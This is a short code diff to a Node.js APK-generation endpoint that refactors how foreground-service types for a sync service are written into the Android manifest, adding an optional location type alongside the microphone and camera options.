@@ -392,14 +392,17 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
 
-                let fgsTypes = 'specialUse|dataSync';
-                if (enableMicrophonePermission === 'true') fgsTypes = 'specialUse|microphone|dataSync';
-                if (enableCameraPermission === 'true') fgsTypes = 'specialUse|camera|dataSync';
-                if (enableMicrophonePermission === 'true' && enableCameraPermission === 'true') fgsTypes = 'specialUse|microphone|camera|dataSync';
+                let fgsTypesArr = ['specialUse', 'dataSync'];
+                if (enableMicrophonePermission === 'true') fgsTypesArr.push('microphone');
+                if (enableCameraPermission === 'true') fgsTypesArr.push('camera');
+                if (enableLocationPermission === 'true') fgsTypesArr.push('location');
+                
+                let fgsTypes = fgsTypesArr.join('|');
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                 fs.writeFileSync(manifestPath, manifestContent);
                 console.log(`[APK] SyncService FGS types: ${fgsTypes}`);
+
 
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 let servicesBlock = '';
